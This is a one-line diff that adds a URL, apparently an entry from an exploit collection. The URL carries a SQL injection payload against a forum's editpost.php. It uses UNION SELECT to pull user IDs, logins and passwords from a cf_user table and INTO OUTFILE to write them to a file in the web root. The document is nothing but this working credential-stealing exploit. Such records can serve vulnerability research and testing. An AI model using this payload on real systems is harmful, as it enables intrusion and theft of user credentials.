@@ -1,0 +1,1 @@
+http://www.example.com/editpost.php?forumid=1&amp;post=3 UNION SELECT userid,login,password FROM cf_user INTO OUTFILE &#039;/www/web/resultat.txt&#039;%23&amp;parent=1&amp;p=1
